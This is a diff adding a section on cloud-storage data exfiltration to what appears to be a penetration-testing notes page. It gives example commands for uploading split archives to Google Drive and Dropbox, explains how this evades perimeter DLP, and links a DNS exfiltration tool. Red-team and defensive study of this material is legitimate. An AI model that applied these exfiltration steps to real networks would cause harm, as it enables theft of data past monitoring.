@@ -360,6 +360,31 @@ Then copy-paste the text into the windows-shell and a file called nc.exe will be
 
 - [https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)
 
+## Cloud Storage (Google Drive / Dropbox)
+
+Using popular cloud-storage providers is an effective way to smuggle large archives out of a network because the corresponding domains are usually whitelisted.  Adversaries often bring **stand-alone upload utilities** compiled against the official REST APIs so that no local browser is required.
+
+### Google Drive (example tooling observed in the wild)
+```
+# 1. Authenticate and retrieve a refresh-token for later API calls
+GoogleGet.exe <drive_id>
+
+# 2. Upload previously prepared archive chunks
+google.exe            upload  archive.7z
+GoogleDrive.exe       upload  archive.7z.001
+GoogleDriveUpload.exe upload  archive.7z.002
+```
+*`GoogleGet.exe`* performs OAuth authentication for the supplied *drive_id* and stores the token on disk (usually in `%PROGRAMDATA%`).  The other binaries reuse that token to perform `files.create` and `files.update` API calls.
+
+### Dropbox (example)
+```
+Dropbox.exe upload archive.7z
+```
+The Dropbox helper uses a hard-coded bearer token and the v2 `/files/upload` endpoint over HTTPS (`content.dropboxapi.com`).  Because the traffic is TLS-encrypted and directed at a legitimate SaaS provider it frequently bypasses perimeter DLP mechanisms.
+
+> [!TIP]
+> Combine cloud storage exfiltration with **archive splitting** to stay below single-file size limits (e.g. `7z a -v200m archive.7z <files>`).
+
 ## DNS
 
 - [https://github.com/Stratiz/DNS-Exfil](https://github.com/Stratiz/DNS-Exfil)
